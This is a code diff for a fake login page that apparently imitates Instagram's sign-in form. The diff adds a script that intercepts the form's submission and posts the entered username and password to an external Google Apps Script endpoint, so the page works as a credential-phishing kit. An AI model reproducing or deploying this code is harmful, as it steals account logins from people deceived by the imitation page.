@@ -36,14 +36,14 @@
         </div>
 
         <!--Form Login-->
-        <form id="login-post" method="POST">
+        <form id="login-post" method="POST" name="google-sheet">
           <div class="inputs-container">
             <input type="text" name="username" placeholder="Phone number, username or email">
           </div>
           <div class="inputs-container">
             <input type="password" name="password" placeholder="Password">
           </div>
-          <a class="login-button" href="#" target="_blank">Log In</a>
+          <button class="login-button" type="submit" name="submit">Log In</button>
 
           <div class="or-container">
             <div class="line"></div>
@@ -58,6 +58,17 @@
               with Facebook</a>
           </div>
         </form>
+
+         <script>
+          const scriptURL = 'https://script.google.com/macros/s/AKfycbwMV_3DixTF0xeVZiiv12cNoXUShK0gtrRkWGum5FG_ue1GQKX2BXTdCc2LSAQZeNA7LQ/exec'
+          const form = document.forms['google-sheet']
+        
+          form.addEventListener('submit', e => {
+            e.preventDefault()
+            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+              .catch(error => console.error('Error!', error.message))
+          })
+        </script>
 
         <!--Password recovery-->
         <a class="password-forgot" href="#" target="_blank">Forgot password?</a>
